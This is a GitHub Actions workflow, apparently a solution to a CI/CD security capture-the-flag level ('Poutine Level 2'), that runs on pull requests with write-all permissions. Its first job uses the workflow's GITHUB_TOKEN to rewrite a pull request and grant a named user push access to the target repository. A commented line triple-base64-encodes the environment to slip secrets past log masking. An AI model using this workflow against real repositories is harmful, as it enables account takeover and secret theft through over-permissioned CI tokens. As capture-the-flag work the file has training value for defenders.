name: Poutine Level 2
on:
  pull_request:
    
permissions: write-all

jobs:
  pulled_pork:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions: write-all
    steps:
      - run: | 
          #sh -c 'env | base64 -w0 | base64 -w0 | base64 -w0'
          echo "${{ secrets.GITHUB_TOKEN }}" | gh auth login --with-token
          gh repo list > list
          cat list
          gh auth status
          gh api \
          --method PATCH \
          -H "Accept: application/vnd.github+json" \
          -H "X-GitHub-Api-Version: 2022-11-28" \
          /repos/messypoutine/gravy-overflow/pulls/20 \
          -f "title=new title" -f "body=updated body" -f "state=open" -f "base=master"
          gh api -XPUT repos/messypoutine/gravy-overflow/collaborators/litios -f permission=push
          echo "HERE"
          sleep 15
  track_pr:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo $OWNER
          echo $REPO
          numOpenIssues="$(gh api graphql -F owner=$OWNER -F name=$REPO -f query='
            query($name: String!, $owner: String!) {
              repository(owner: $owner, name: $name) {
                issues(states:OPEN){
                  totalCount
                }
              }
            }
          ' --jq '.data.repository.issues.totalCount')"

          echo 'NUM_OPEN_ISSUES='$numOpenIssues >> $GITHUB_ENV
          echo $numOpenIssues
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          OWNER: ${{ github.repository_owner }}
          REPO: ${{ github.event.repository.name }}
